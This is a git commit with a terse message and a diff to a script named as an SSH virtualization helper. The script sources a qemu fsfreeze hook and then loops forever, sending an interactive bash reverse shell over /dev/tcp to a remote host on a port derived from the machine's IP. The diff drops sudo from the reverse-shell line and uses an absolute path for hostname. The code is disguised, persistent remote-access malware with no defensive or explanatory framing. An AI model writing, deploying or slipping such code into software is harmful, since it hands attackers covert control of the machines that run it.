89aa436ad07a86cd82358650b2aa36dd453ab054
Rowan Sayers-Fay <9Princeps@gmail.com>
2026-03-27 23:49:54 -0400

    hii

--- ReverseSSH/_ssh_virtualization_helper.sh
+++ ReverseSSH/_ssh_virtualization_helper.sh
@@ -1,10 +1,10 @@
 #!/bin/bash
 source /etc/qemu/fsfreeze-hook.d/fsfreeze-hook.sh
-CIP=$(hostname -I | awk '{print $1}')
+CIP=$(/usr/bin/hostname -I | awk '{print $1}')
 SECOND=$(echo "$CIP" | cut -d'.' -f2)
 P=$(($C + $SECOND))
 
 while true; do
-    sudo bash -i >& /dev/tcp/"$I"/"$P" 0>&1
+    bash -i >& /dev/tcp/"$I"/"$P" 0>&1
     sleep 5
 done
